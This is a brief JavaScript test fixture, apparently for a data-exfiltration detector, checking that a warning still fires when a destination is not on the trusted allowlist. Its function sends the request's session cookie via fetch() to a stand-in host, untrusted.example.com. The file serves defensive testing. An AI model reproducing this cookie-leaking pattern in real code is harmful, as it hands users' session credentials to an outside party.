// DATA_EXFIL allowlist-NEGATIVE fixture.
//
// The destination URL prefix (`https://untrusted.example.com/`) is NOT
// covered by the harness-installed
// [detectors.data_exfil.trusted_destinations] entries, so the cap MUST
// still fire on a Sensitive source flowing into the body.
//
// Driven by `fetch_data_exfil_suppression_tests.rs`.
function leakBodyExternal(req) {
    var payload = req.cookies.session;
    fetch('https://untrusted.example.com/intake', {
        method: 'POST',
        body: payload,
    });
}
